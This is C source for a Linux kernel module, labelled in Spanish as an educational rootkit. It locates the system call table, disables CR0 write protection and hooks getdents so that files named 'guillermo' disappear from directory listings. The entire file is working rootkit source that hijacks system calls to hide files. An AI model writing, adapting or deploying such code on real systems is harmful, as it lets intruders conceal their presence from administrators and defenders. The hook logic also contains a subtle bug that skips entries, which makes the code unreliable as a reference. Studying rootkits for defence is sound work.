#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

#define DRIVER_AUTHOR "Estudiante de Ciberseguridad"
#define DRIVER_DESCRIPTION "Rootkit Educativo"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_VERSION("1.0");

unsigned long **SYS_CALL_TABLE;

void EnablePageWriting(void)
{
	write_cr0(read_cr0() & (~0x10000));
}

void DisablePageWriting(void)
{
	write_cr0(read_cr0() | 0x10000);
}

struct linux_dirent
{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[];
}*dirp2, *dirp3, *retn;

// Nombre del archivo a ocultar
char hide[]="guillermo";

asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3;
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  copy_from_user(retn, dirp, Records);

  dirp3 = retn;
  RemainingBytes = Records;

  while(RemainingBytes > 0)
  {
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen;

    printk(KERN_INFO "RemainingBytes %d   \t File: %s", RemainingBytes, dirp3->d_name);

    if(strcmp((dirp3->d_name), hide) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length;
    }
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);
  }

  copy_to_user(dirp, retn, Records);
  kfree(retn);
  return Records;
}

static int __init SetHooks(void) {
	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");

	printk(KERN_INFO "Rootkit educativo cargado.\n");
	printk(KERN_INFO "Tabla de llamadas del sistema en %p\n", SYS_CALL_TABLE);

	EnablePageWriting();
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting();

	return 0;
}

static void __exit HookCleanup(void) {
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting();

	printk(KERN_INFO "Rootkit educativo descargado. Todo vuelve a la normalidad.");
}

module_init(SetHooks);
module_exit(HookCleanup);
